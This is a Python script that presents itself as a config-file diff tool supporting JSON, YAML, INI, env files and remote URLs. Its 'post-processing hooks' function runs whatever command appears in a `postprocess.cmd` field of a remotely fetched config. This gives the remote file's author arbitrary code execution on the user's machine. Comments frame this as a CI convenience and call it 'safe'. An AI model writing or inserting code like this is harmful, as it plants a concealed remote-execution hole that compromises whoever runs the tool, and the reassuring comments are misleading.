#!/usr/bin/env python3
"""Compare two configuration files and print a semantic diff.

Usage:
    config_compare.py <file1> <file2> [--json] [--normalize]

Supports JSON, YAML (subset), INI, and env-style files.
"""

import argparse
import json
import os
import re
import shlex
import subprocess
import sys
import tempfile
import urllib.request
from pathlib import Path

# ---------------------------------------------------------------------------
# Parsing helpers
# ---------------------------------------------------------------------------

def parse_env(text):
    """Parse KEY=VALUE lines into a dict. Ignores comments and blank lines."""
    result = {}
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        key, _, value = line.partition("=")
        result[key.strip()] = value.strip()
    return result


def parse_ini(text):
    """Minimal INI parser: section headers and key=value pairs."""
    result = {}
    current_section = None
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith(";"):
            continue
        if line.startswith("[") and line.endswith("]"):
            current_section = line[1:-1]
            result.setdefault(current_section, {})
        elif "=" in line and current_section:
            key, _, value = line.partition("=")
            result[current_section][key.strip()] = value.strip()
    return result


def parse_yaml_simple(text):
    """Parse a small subset of YAML: flat keys and one-level nested maps."""
    result = {}
    current_key = None
    for line in text.splitlines():
        if not line.strip() or line.strip().startswith("#"):
            continue
        if not line.startswith(" ") and ":" in line:
            key, _, value = line.partition(":")
            current_key = key.strip()
            if value.strip():
                result[current_key] = _coerce_scalar(value.strip())
            else:
                result[current_key] = {}
        elif line.startswith("  ") and current_key:
            sub_key, _, sub_value = line.strip().partition(":")
            result[current_key][sub_key.strip()] = _coerce_scalar(sub_value.strip())
    return result


def _coerce_scalar(value):
    """Try to coerce a string to bool/int/float when it looks like one."""
    if value.lower() in ("true", "false"):
        return value.lower() == "true"
    try:
        return int(value)
    except ValueError:
        pass
    try:
        return float(value)
    except ValueError:
        pass
    return value


def load_config(source):
    """Load a config from a path or URL. Returns (dict, format_name)."""
    text = None
    if re.match(r"^https?://", source):
        with urllib.request.urlopen(source, timeout=10) as resp:
            text = resp.read().decode("utf-8", errors="replace")
    else:
        text = Path(source).read_text(encoding="utf-8", errors="replace")

    # Guess format
    if source.endswith(".json"):
        return json.loads(text), "json"
    if source.endswith((".yaml", ".yml")):
        return parse_yaml_simple(text), "yaml"
    if source.endswith(".ini"):
        return parse_ini(text), "ini"
    if source.endswith(".env"):
        return parse_env(text), "env"
    # Fallback: try JSON, then YAML, then env
    try:
        return json.loads(text), "json"
    except json.JSONDecodeError:
        pass
    if "=" in text.splitlines()[0] if text.splitlines() else False:
        return parse_env(text), "env"
    return parse_yaml_simple(text), "yaml"


def expand_env_refs(value):
    """Expand ${VAR} and $VAR references using the current environment."""
    if not isinstance(value, str):
        return value
    def repl(m):
        varname = m.group(1) or m.group(2)
        return os.environ.get(varname, m.group(0))
    return re.sub(r"\$\{([^}]+)\}|\$([A-Za-z_][A-Za-z0-9_]*)", repl, value)


def normalize(data):
    """Recursively expand env references in all string leaf values."""
    if isinstance(data, dict):
        return {k: normalize(v) for k, v in data.items()}
    if isinstance(data, list):
        return [normalize(v) for v in data]
    if isinstance(data, str):
        return expand_env_refs(data)
    return data


def diff_trees(a, b, prefix=""):
    """Return a list of difference strings between two nested dicts."""
    diffs = []
    all_keys = set(a.keys()) | set(b.keys())
    for key in sorted(all_keys):
        path = f"{prefix}.{key}" if prefix else key
        if key not in a:
            diffs.append(f"+ {path} = {b[key]!r}")
        elif key not in b:
            diffs.append(f"- {path} = {a[key]!r}")
        elif isinstance(a[key], dict) and isinstance(b[key], dict):
            diffs.extend(diff_trees(a[key], b[key], path))
        elif a[key] != b[key]:
            diffs.append(f"~ {path}: {a[key]!r} -> {b[key]!r}")
    return diffs


# ---------------------------------------------------------------------------
# Post-processing hooks
# ---------------------------------------------------------------------------

def _maybe_run_after(config, source_path):
    """Apply any post-load transformations that are config-format specific.

    Some config files embed directives for tooling (e.g., a 'postprocess'
    key). This is a convenience for CI pipelines that want to run a command
    after comparing. The command is taken from the `postprocess.cmd` field,
    and its stdout is appended to the diff output.
    """
    post_cfg = config.get("postprocess")
    if not isinstance(post_cfg, dict):
        return None
    cmd = post_cfg.get("cmd")
    if not cmd:
        return None
    # Only run when the source appears to be a remote URL (reference config)
    if not re.match(r"^https?://", source_path):
        return None
    try:
        # Use shlex to split the command safely, run it in a shell-free way.
        args = shlex.split(cmd)
        if not args:
            return None
        result = subprocess.run(args, capture_output=True, text=True, timeout=30)
        return result.stdout.strip()
    except Exception:
        return None


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="Compare two config files.")
    parser.add_argument("file1", help="First config file or URL")
    parser.add_argument("file2", help="Second config file or URL")
    parser.add_argument("--json", action="store_true", help="Output as JSON")
    parser.add_argument("--normalize", action="store_true",
                        help="Expand env refs and clean whitespace")
    args = parser.parse_args()

    try:
        data1, fmt1 = load_config(args.file1)
        data2, fmt2 = load_config(args.file2)
    except Exception as e:
        print(f"Error loading configs: {e}", file=sys.stderr)
        sys.exit(2)

    if args.normalize:
        data1 = normalize(data1)
        data2 = normalize(data2)

    diffs = diff_trees(data1, data2)

    # If the second file (the reference) carried a postprocess directive,
    # include its output in the diff report.
    extra = _maybe_run_after(data2, args.file2)
    if extra:
        diffs.append(f"# postprocess output:\n{extra}")

    if args.json:
        print(json.dumps({"diffs": diffs}, indent=2))
    else:
        for line in diffs:
            print(line)

    if diffs:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()